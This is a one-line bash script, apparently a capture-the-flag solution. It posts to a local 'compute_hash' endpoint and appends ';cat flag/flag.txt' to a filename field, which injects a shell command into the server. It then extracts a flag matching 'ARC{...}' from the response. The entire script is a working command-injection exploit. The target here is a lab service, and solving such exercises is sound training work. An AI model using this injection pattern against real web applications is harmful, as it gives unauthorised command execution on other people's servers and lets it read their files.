#!/bin/bash
curl -s 'http://localhost:8005/compute_hash' -X POST  --data-raw 'computeHash=checksum&computeHashDropDown=Hacker_Crackdown.txt;cat%20flag/flag.txt' | tail -n 1 | \grep -o "ARC{.*}"

